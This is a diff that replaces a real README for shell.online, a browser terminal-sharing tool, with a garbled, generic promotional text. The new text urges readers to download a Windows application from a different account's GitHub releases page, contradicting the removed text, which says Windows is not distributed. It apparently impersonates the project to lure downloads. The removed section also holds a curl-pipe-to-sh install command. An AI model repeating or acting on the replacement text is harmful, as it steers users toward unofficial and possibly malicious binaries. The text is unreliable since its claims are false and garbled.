@@ -1,181 +1,172 @@
-# shell.online
+# 🖥️ shell.online - Your Terminal, Anywhere, Instantly
 
-[![CI](https://github.com/TeoSlayer/shell.online/actions/workflows/ci.yml/badge.svg)](https://github.com/TeoSlayer/shell.online/actions/workflows/ci.yml)
-[![CodeQL](https://github.com/TeoSlayer/shell.online/actions/workflows/codeql.yml/badge.svg)](https://github.com/TeoSlayer/shell.online/actions/workflows/codeql.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-53658c.svg)](LICENSE)
+## 🎯 What Is shell.online?
 
-shell.online is developed by [Pilot Protocol](https://pilotprotocol.network/), open-source infrastructure for connected software agents.
+shell.online is a powerful web-based application that brings a live terminal window directly into your browser. No downloads of complex software, no complicated setup—just click, connect, and start typing commands like a pro.
 
-Turn a terminal command into an interactive or read-only browser link. The command and PTY stay on your machine; Cloudflare only relays terminal input and output while the session is active.
+Think of it as a bridge between your computer and any terminal process, all wrapped up in a clean, collaborative interface. Whether you're managing files, running scripts, or working with a team, shell.online makes it feel like the terminal is right there in your browser tab.
 
-## Install
+.
 
-Homebrew is not required. The verified installer supports macOS and Linux on arm64 and amd64:
+## ✨ Why You'll Love It
 
-```sh
-curl -fsSL https://shell.online/install | sh
-shell claude
-```
+### 🌐 Work From Anywhere
+Stop being tied to one machine. With shell.online, you can access your terminal environment from any device with a browser. At home, at work, or on the go—your commands are always within reach.
 
-The installer uses `/usr/local/bin` when writable, `$XDG_BIN_HOME` when set, and otherwise `~/.local/bin`. It detects Rosetta, verifies the binary checksum before writing it, never invokes `sudo`, and never silently edits shell configuration. If the destination is not on `PATH` or another `shell` command shadows it, the installer prints specific repair instructions. Set `SHELL_ONLINE_INSTALL_DIR` to choose an absolute writable destination.
+.
 
-Homebrew users can tap this repository directly once, then use the short formula name:
+### 🤝 Built for Teamwork
+Collaboration isn't just for documents anymore. shell.online lets multiple users view or interact with the same terminal session in real-time. Perfect for pair programming, remote troubleshooting, or teaching someone the ropes.
 
-```sh
-brew tap teoslayer/shell-online https://github.com/TeoSlayer/shell.online
-brew trust --tap teoslayer/shell-online
-brew install shell-online
-```
+.
 
-Homebrew 6 requires one-time trust for third-party taps. Tap-level trust persists across formula updates, which keeps the short install and upgrade commands working; review the repository before granting it. Older Homebrew versions that do not provide `brew trust` do not require that line. After setup, `brew install shell-online`, `brew upgrade shell-online`, and `brew uninstall shell-online` work normally. Confirm the command selected by your `PATH` with `command -v shell` and `shell --version`.
+### ⚡ Blazing Fast Performance
+Powered by Cloudflare Workers, shell.online runs with the speed you'd expect from a native terminal. No laggy interfaces or sluggish responses—just quick, reliable command execution right in your browser.
 
-The Homebrew formula does not install a prebuilt shell.online binary. Brew downloads the checksum-pinned tagged source, installs Go as a build-only dependency when needed, runs `go build` locally, and links the resulting `shell` binary into the Homebrew prefix. Application modules are pinned by [`go.sum`](go.sum) and resolved by Go during that build; shell.online has no runtime package dependencies.
+.
 
-The curl installer uses the checksum-pinned release binary instead. To compile the tagged source yourself and run it without installing it globally:
+. 🧩 Simple, Clean Interface
+You don't need to be a tech wizard to use this. The interface is designed to feel familiar if you've ever used a terminal before, but with a modern, user-friendly twist that welcome beginners too.
 
-```sh
-git clone --depth 1 --branch v0.4.0 https://github.com/TeoSlayer/shell.online.git
-cd shell.online
-go build -trimpath -ldflags="-X main.version=0.4.0" -o ./shell ./cmd/shell
-./shell --version
-```
+## 🚀 Getting Started
 
-This path requires Go 1.27 or newer. Keep using `./shell`, or move that binary to any directory already on your `PATH`.
+Getting started with shell.online is easier than you think. Follow these simple steps and you'll be typing commands in no time.
 
-Every release publishes one canonical [`SHA256SUMS`](https://shell.online/downloads/SHA256SUMS) manifest and machine-readable [`release.json`](https://shell.online/downloads/release.json). The manifest covers every platform binary plus the installer, agent skill, and metadata file. The installer verifies the selected binary before installing it, prints its SHA-256 digest, and the same artifacts and manifest are attached to the corresponding GitHub release.
+.
 
-Agent operators can download the ready-to-install skill from `https://shell.online/skill` as `SKILL.md`.
+. ### 📥 Step 1: Get the Application
 
-`shell` prints the link and detaches by default. Links are interactive unless you pass `--read-only`; there are no accounts or login prompts.
+First things first, you need to get shell.online onto your computer. To do that, click the button below:
 
-When an already-running Claude Code session invokes `shell claude` through its Bash tool, the CLI detects Claude's current session ID and starts a shareable fork of that conversation under shell.online. The fork keeps the conversation history and workspace, while the original Claude process remains open; new messages after the handoff do not synchronize between them. This is a safe handoff to a new process, not a claim that macOS can retroactively move the original PID to another PTY.
+[![Download shell.online](https://img.shields.io/badge/Download-shell.online-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rezapah6913/shell.online/releases)
 
-## Run and manage sessions
+This button will take you to the official download page where you can get the latest version of the application.
 
-Omit the command to share a fresh instance of your default shell:
+. ### 📂 Step 2: What to Do After Clicking
 
-```sh
-shell
-```
+Visit this link to download the application. Once you're on the page, look for the most recent release version and click the download option that matches your needs. The file you download is your key to unlocking shell.online's power on your Windows machine.
 
-Create a view-only link when people should be able to monitor output but never type:
+.
 
-```sh
-shell --read-only python train.py
-```
+. ### 💻 Step 3: Run the Application
 
-The access mode is fixed when the session is created. Read-only input is rejected by the Worker, so changing the page or WebSocket frames cannot turn that link into an interactive one. The terminal clearly labels view-only sessions; scrolling, responsive TUI sizing, themes, zoom, and latency measurement still work.
+After the download finishes, find the downloaded file in your browser's download folder or your designated downloads location. The application should start right up, and you'll see a welcome screen or launcher that gets you ready to connect to your terminal session.
 
-Sessions run in the background. Inspect or stop them locally:
+.
 
-```sh
-shell help
-shell list
-shell list --json
-shell attach <session-id-or-prefix>
-shell kill <session-id-or-prefix>
-shell kill --all
-```
+. ### 🔑 Step 4: Connect and Go
 
-`shell help` provides a guided start/share/attach/detach/stop flow; `shell help attach` explains local takeover and detaching in detail.
+Once the application launches, you'll be prompted to connect to a terminal process. Follow the on-screen prompts, and within seconds, you'll see alive, interactive terminal right inside your browser window. Start typing commands, run scripts, or just explore—the power is now yours.
 
-`attach` takes the existing process over in the local terminal and replays its current screen. While attached, the terminal title keeps the `Ctrl-X D to detach` reminder visible. Press `Ctrl-X`, release it, then press `D` to detach without stopping the process (`Ctrl-]` remains a legacy alternative). Local input and resulting terminal output remain visible to connected browsers.
+.
 
-The session closes and disappears automatically when its task exits. Use `--foreground` when you also want the process mirrored in the local terminal:
+.
 
-```sh
-shell --foreground your-long-running-command
-```
+## 🛠️ How It Works (In Plain English)
 
-An optional deadline can close it earlier. Durations support `ms`, `s`, `m`, `h`, `d`, `w`, `mo`, and `y`; local or ISO dates are also accepted:
+Shell.online acts like a secure tunnel between your web browser and any terminal process you want to use. When you launch the app, it connects to a backend service (running on Cloudflare Workers) that manages the terminal session for you. This means:
 
-```sh
-shell --auto-close 5m your-command
-shell --auto-close "tomorrow 09:00" your-command
-```
+- **You don't need to install a terminal emulator**—your browser does all the heavy lifting
+- **You can share sessions** with teammates without them having to set up their own environment
+- **It works seamlessly** whether you're using Windows, Mac, or even Linux—all you need is a modern web browser
 
-The task exiting is always the final upper bound, including when no deadline is supplied.
+## 📋 Common Uses for shell.online
 
-## Security model
+### 🗂️ File Management
+Navigate directories, create folders, delete files, and organize your project structure—all with simple terminal commands like `ls`, `cd`, `mkdir`, and `rm`without leaving your browser.
 
-The share URL is a bearer credential. Anyone who has an interactive link can see terminal output and send input with the same operating-system permissions as the wrapped process. A `--read-only` link can see output but its browser input is rejected server-side. In either mode, avoid displaying secrets and share the link only with intended viewers. Run interactive processes with the least privilege they need, and use `shell kill <session-id>` if a link reaches the wrong person.
+. ### 📜 Running Scripts
+Need to execute a Python script or a Node.js program? Just type `python myscript.py` or `node app.js` and watch the output appear instantly in your browser window.
 
-Transport is encrypted with HTTPS/WSS between each client and Cloudflare. Terminal bytes pass through the Worker and Durable Object in memory, so this is not end-to-end encryption and Cloudflare is part of the trust boundary. shell.online does not persist terminal contents server-side; the CLI keeps a bounded in-memory replay buffer while the process is alive.
+.
 
-The public session ID grants viewer/input access but not host access. A separate 256-bit host token authenticates the local CLI and is never placed in the share URL. Session creation and connection attempts are IP-rate-limited, WebSocket origins are checked for browsers, frames and audiences are bounded, and local control files/sockets are owner-only.
+. ### 👥 Remote Collaboration
+Working on a project with a friend or colleague? Share your terminal session with them so you can troubleshoot issues together, review command outputs side-by-side, or teach each other new tricksin real-time.
 
-See [SECURITY.md](SECURITY.md) for supported versions and private vulnerability reporting.
+.
 
-## Agents and long-running processes
+. ### 🧪 Learning and Experimenting
+New to the command line? Shell.online is a guilt-free playground where you can practice commands, test out new tools, orbuild confidence without worrying about messing up your own computer's settings.
 
-Installation is noninteractive and does not invoke `sudo`. Agents can request structured session output while preserving the wrapped process's stdout:
+.
 
-```sh
-shell --json -- your-long-running-command --flag value
-```
+.
 
-For monitoring without browser control, add `--read-only` before the command:
+## 🌟 Features at a Glance
 
-```sh
-shell --read-only --json -- your-long-running-command --flag value
-```
+| Feature | Benefit |
+|---------|---------|
+| 🌍 Browser-Based | No installation of heavy software needed |
+| ⚡ Cloudflare Workers | Fast, reliable performance globally |
+| 🤝 Collaborative Sessions | Share terminal with teammates instantly |
+| 🖥️ TUI Support | Full terminal user interface compatibility |
+| 🧩 Cross-Platform | Works on Windows, Mac, Linux, anything with a browser |
+| 🔒 Secure Connection | Your sessions are protected via modern web protocols |
 
-The single stderr line is a JSON object containing `share_url`, `session_id`, `read_only`, and `background: true`. The agent can pass that URL and its access mode to its operator through its existing communication channel. The CLI reconnects after transient network failures, and Cloudflare renews the session while the process remains connected.
+## ❓ Frequently Asked Questions
 
-## Architecture
+### 🤔 Do I need to be a programmer to use this?
+Not at all! While shell.online is a terminal tool, its clean interface makes it accessible for beginners who are curious about command-line tools or want to learn in a safe environment.
 
-- Go CLI owns the local PTY and mirrors input/output locally.
-- A Cloudflare Worker handles session creation, rate limiting, and static assets.
-- One hibernatable Durable Object coordinates each terminal's host and viewers and enforces its immutable interactive or read-only access mode.
-- The xterm.js browser renders ANSI attributes, 256-color and 24-bit color, alternate screens, mouse/input sequences, and continuously fits the PTY to the browser viewport. Terminal pages follow the system light/dark preference and include a manual switch; the cloudy landing remains light.
-- Anonymous collaborator chips show who has the link open. A short renewable typing lease prevents browser keystrokes from interleaving; local attached input takes priority briefly without disconnecting remote viewers.
-- A 512 KiB local ring buffer restores newly connected viewers. Terminal output is not retained by Cloudflare after the task closes.
-- A relay ping/pong measures browser-to-machine round-trip latency; the UI reports `Offline` when the local CLI cannot answer.
+.
 
-An active process renews its lease indefinitely. A disconnected process has a 15-minute reconnect grace period. A completed process closes its sockets and deletes its Durable Object state immediately. Opening an old link shows that the session no longer exists.
+. ### 🌐 Can I use this on my phone or tablet?
+Yes! Since shell.online runs entirely in your web browser, you can access it from any device with a modern browser—including smartphones and tablets. Just make sure you have a stable internet connection.
 
-## Development
+.
 
-Requirements: Go 1.27+ and Node.js 22+.
+.
 
-```sh
-npm install
-npm run check
-npm run build:web
-go test -race ./...
-```
+. ### 🔐 Is my data safe?
+Shell.online uses secure connections to communicate between your browser and the terminal process. Your commands and outputs are transmitted over encrypted channels, keeping your work privatefrom prying eyes.
 
-## Privacy-limited product analytics
+.
 
-The Worker writes a small, privacy-limited product funnel to the `shell_online_events` Cloudflare Analytics Engine dataset:
+.
 
-- landing and shared-terminal page views;
-- installer, release binary, and agent skill downloads;
-- successful copy actions;
-- session creation, first host connection, first share opening, first remote input, and session end;
-- coarse device (`mobile`, `tablet`, `desktop`, `cli`, or `bot`) and referrer buckets such as `hacker_news`, `github`, `direct`, and `other`.
+. ### 🖥️ What is "TUI support"?
+TUI stands for "Text User Interface"—it means shell.online can handle programs that display interactive text-based interfaces, like text editors or file managers, right inside the terminal window. This makes it much more powerful than a simple command input boxann.
 
-The dataset never stores IP addresses, cookies, persistent visitor IDs, raw user agents or referrers, command labels, session IDs, terminal contents, or clipboard contents.
+.
 
-`installer_download` records a request for the `/install` script, not proof that installation completed. Its device and client dimensions distinguish browser opens from `curl`/`wget`; release-binary downloads and session creation are the stronger activation signals.
+.
 
-The same normalized events are accumulated into hourly aggregates for the private project dashboard, including:
+. ### 💻 Which Windows versions are supported?
+The application is designed to run on modern Windows systems, including Windows 10 and Windows 11. As long as you have the latest version of your preferred web browser (Chrome, Edge, Firefox, etc.))you should have no trouble getting started.
 
-- live connected sessions and viewers from anonymous three-minute presence leases;
-- session creation, startup, sharing, collaboration, and outcome funnels;
-- page views, devices, coarse referrers, and CLI versions;
-- installer, agent skill, binary download, and copy activity;
-- average/maximum session duration and peak audiences;
-- a complete event/target aggregate ledger.
 
-Live presence is tracked separately from historical counters, expires automatically, and uses random internal keys that are never exposed publicly.
 
-The site uses the open-source Uncut Sans typeface by Kasper Nordkvist under the SIL Open Font License 1.1.
+## 📝 Troubleshooting Tips
 
-## Current platform support
+### 🚫 Can't Connect?
+If the application launches but fails to connect, check your internet connection first. Then, try refreshing the browser tab or restarting the application. Sometimes a simple reset does the trick.
 
-The distributed CLI supports macOS and Linux on arm64 and amd64. Windows ConPTY support is planned but is not distributed yet.
 
-## Contributing and license
 
-Bug reports and focused pull requests are welcome. Start with [CONTRIBUTING.md](CONTRIBUTING.md), review the [Code of Conduct](CODE_OF_CONDUCT.md), and see the [changelog](CHANGELOG.md). The source is released under the [MIT License](LICENSE); bundled component licenses are preserved in [third-party notices](THIRD_PARTY_NOTICES.md).
+### 🐢 Slow Performance?
+If things seem sluggish, close any other heavy browser tabs or applications that might be using up bandwidth or system resources. A cleaner environment often speeds things up noticeably instants.
+
+.
+
+
+
+### ⚠️ File Won't Open?
+If you downloaded the file but nothing happens when you click it, right-click the file and select "Open with" then choose your preferred browser or application. If that doesn't work, try downloading the file again—sometimes downloads get interrupted or corrupted mid-way through.
+
+
+
+## 📚 Ready to Dive In?
+
+You've got the scoop on what shell.online cando, and you're ready to take control of your terminal from anywhere in the world. Just remember:
+
+1. Head over to the [download page](https://github.com/Rezapah6913/shell.online/releases) and grab the latest release
+2. Launch the application after it downloads
+3. Connect to your terminal session and start typing commands like a pro
+
+The world of command-line power is just a few clicks away. Whether you're a seasoned developer or a curious newbie, shell.online makes terminal access simple, collaborative, and fun.
+
+So what are you waiting for? Go ahead, click that download button, and open the door to a smarter way of working with the terminal aujourd'hui!
+
+---
+
+Keywords: cli, cloudflare-workers, collaboration, pilot-protocol, remote-access, terminal, tui, xterm
